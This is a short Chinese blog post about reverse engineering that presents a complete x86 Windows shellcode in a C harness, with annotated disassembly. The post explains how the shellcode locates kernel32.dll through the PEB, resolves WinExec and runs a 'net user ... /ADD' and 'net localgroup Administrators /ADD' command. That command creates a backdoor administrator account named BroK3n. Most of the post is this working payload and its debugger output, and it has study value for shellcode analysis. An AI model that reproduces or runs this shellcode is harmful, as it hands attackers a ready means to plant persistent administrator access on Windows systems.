
---
title: "添加管理员的shellcode"
date: 2014-08-07T09:13:30+08:00
draft: true
categories: ["调试逆向"]
tags: ["调试逆向"]
topics: ["调试逆向"]
---

看到一个通用的加管理员shellcode，很经典的利用PEB查找kernel32.dll然后找到WinExec函数地址，压栈并执行。中规中矩，不过中规中矩就是最大的亮点。

<!--more-->

```

int main()
{
	unsigned long *Addr;
	char shellcode[] = 
		"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
		"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
		"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
		"\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a"
		"\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf"
		"\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f"
		"\x41\x44\x44\x68\x6f\x72\x73\x20\x68\x74\x72\x61\x74\x68\x69"
		"\x6e\x69\x73\x68\x20\x41\x64\x6d\x68\x72\x6f\x75\x70\x68\x63"
		"\x61\x6c\x67\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
		"\x44\x20\x26\x68\x6e\x20\x2f\x41\x68\x72\x6f\x4b\x33\x68\x33"
		"\x6e\x20\x42\x68\x42\x72\x6f\x4b\x68\x73\x65\x72\x20\x68\x65"
		"\x74\x20\x75\x68\x2f\x63\x20\x6e\x68\x65\x78\x65\x20\x68\x63"
		"\x6d\x64\x2e\x89\xe5\xfe\x4d\x53\x31\xc0\x50\x55\xff\xd7";

	Addr = (unsigned long*)shellcode;
	__asm
	{
		jmp Addr;
	}
	return 0;
}


```


```

31D2            XOR EDX,EDX
B2 30           MOV DL,30
64:8B12         MOV EDX,DWORD PTR FS:[EDX]                   // edx = PEB
8B52 0C         MOV EDX,DWORD PTR DS:[EDX+C]                 // edx = PEB.ldr : _PEB_LDR_DATA
8B52 1C         MOV EDX,DWORD PTR DS:[EDX+1C]                // edx = PEB.ldr.InInitializationOrderModuleList : _LIST_ENTRY

//////////////////////////////
8B42 08         MOV EAX,DWORD PTR DS:[EDX+8]                 // eax = ***.dll
8B72 20         MOV ESI,DWORD PTR DS:[EDX+20]                // esi = u"***.dll"
8B12            MOV EDX,DWORD PTR DS:[EDX]                   // edx = The prev link_entry
807E 0C 33      CMP BYTE PTR DS:[ESI+C],33                   // 0x33 = 3, Find kernel32.dll
75 F2           JNZ SHORT     // Jmp back 14 bytes
///////////////////////////// This circle find kernel32.dll


89C7            MOV EDI,EAX                                  // edi = kernel.dll
0378 3C         ADD EDI,DWORD PTR DS:[EAX+3C]                // edi = PE_HEADER, skip the dos header
8B57 78         MOV EDX,DWORD PTR DS:[EDI+78]                // edx = offset  of _IMAGE_EXPORT_DIRECTORY
01C2            ADD EDX,EAX                                  // edx = Address of _IMAGE_EXPORT_DIRECTORY
8B7A 20         MOV EDI,DWORD PTR DS:[EDX+20]                // edx = offset  of AddressOfNames
01C7            ADD EDI,EAX                                  // edx = address of AddressOfNames



31ED            XOR EBP,EBP
8B34AF          MOV ESI,DWORD PTR DS:[EDI+EBP*4]
01C6            ADD ESI,EAX
45              INC EBP
813E 57696E45   CMP DWORD PTR DS:[ESI],456E6957              // find the address of WinExec
75 F2           JNZ SHORT 0012FEE4



8B7A 24         MOV EDI,DWORD PTR DS:[EDX+24]                // edi = offset of AddressOfNameOrdinals 
01C7            ADD EDI,EAX                                  // edi = Address of AddressOfNameOrdinals
66:8B2C6F       MOV BP,WORD PTR DS:[EDI+EBP*2]               // bp = Ordinal of WinExec
8B7A 1C         MOV EDI,DWORD PTR DS:[EDX+1C]                // edi = offset of AddressOfFunctions
01C7            ADD EDI,EAX                                  // edi = Address of AddressOfFunctions
8B7CAF FC       MOV EDI,DWORD PTR DS:[EDI+EBP*4-4]           // edi = offset of WinExec
01C7            ADD EDI,EAX                                  // edi = Address of WinExec


68 4B336E01     PUSH 16E334B
68 2042726F     PUSH 6F724220
68 2F414444     PUSH 4444412F
68 6F727320     PUSH 2073726F
68 74726174     PUSH 74617274
68 696E6973     PUSH 73696E69
68 2041646D     PUSH 6D644120
68 726F7570     PUSH 70756F72
68 63616C67     PUSH 676C6163
68 74206C6F     PUSH 6F6C2074
68 26206E65     PUSH 656E2026
68 44442026     PUSH 26204444
68 6E202F41     PUSH 412F206E
68 726F4B33     PUSH 334B6F72
68 336E2042     PUSH 42206E33
68 42726F4B     PUSH 4B6F7242
68 73657220     PUSH 20726573
68 65742075     PUSH 75207465
68 2F63206E     PUSH 6E20632F
68 65786520     PUSH 20657865
68 636D642E     PUSH 2E646D63
89E5            MOV EBP,ESP

0:000> db ebp
0012fe18  63 6d 64 2e 65 78 65 20-2f 63 20 6e 65 74 20 75  cmd.exe /c net u
0012fe28  73 65 72 20 42 72 6f 4b-33 6e 20 42 72 6f 4b 33  ser BroK3n BroK3
0012fe38  6e 20 2f 41 44 44 20 26-26 20 6e 65 74 20 6c 6f  n /ADD && net lo
0012fe48  63 61 6c 67 72 6f 75 70-20 41 64 6d 69 6e 69 73  calgroup Adminis
0012fe58  74 72 61 74 6f 72 73 20-2f 41 44 44 20 42 72 6f  trators /ADD Bro
0012fe68  4b 33 6e 01 ee f6 41 01-46 f7 41 01 00 f0 fd 7f  K3n...A.F.A.....
0012fe78  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0012fe88  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................


FE4D 53         DEC BYTE PTR SS:[EBP+53]
31C0            XOR EAX,EAX
50              PUSH EAX
55              PUSH EBP
FFD7            CALL EDI


```

原谅我蹩脚的英文\拼音注释，虚拟机没装输入法。
